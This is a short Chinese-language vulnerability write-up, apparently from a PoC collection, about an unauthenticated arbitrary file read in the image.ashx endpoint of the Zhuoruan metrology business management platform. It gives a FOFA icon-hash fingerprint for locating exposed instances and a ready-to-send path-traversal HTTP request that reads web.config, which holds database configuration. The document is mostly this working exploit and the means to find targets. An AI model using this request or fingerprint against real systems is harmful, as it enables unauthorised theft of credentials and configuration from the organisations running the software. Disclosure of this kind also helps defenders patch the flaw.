# 卓软计量业务管理平台image.ashx任意文件读取漏洞

卓软计量业务管理平台 image.ashx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa
```javascript
icon_hash="-334571363"
```

## poc
```javascript
GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20241227214332200](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272143297.png)